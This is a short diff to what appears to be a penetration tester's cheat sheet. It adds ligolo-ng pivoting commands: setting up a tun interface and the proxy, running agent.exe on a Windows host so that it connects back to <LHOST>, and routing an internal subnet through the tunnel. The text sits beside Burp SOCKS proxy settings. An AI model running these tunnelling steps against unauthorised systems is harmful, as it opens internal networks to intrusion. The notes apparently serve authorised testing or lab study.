@@ -57,4 +57,13 @@ curl localhost:<ANY_LOCAL_PORT>
 foxyproxy: localhost:8080 (burpsuite proxy)
 burpsuite: "Settings" (upper right-hand corner) > "Network" (left sidebar) > "SOCKS Proxy" (scroll to the bottom) > Check "Override options for this project only" > 127.0.0.1 for the host and 1080 for the port
 
+# ligolo
+sudo ip tuntap add user <USER> mode tun ligolo
+sudo ip link set ligolo up
+ligolo-proxy -selfcert
+C:\Windows\Tasks>agent.exe -connect <LHOST>:11601 -ignore-cert
+sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo
+ligolo-ng » session
+[Agent : ...] » start
+
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
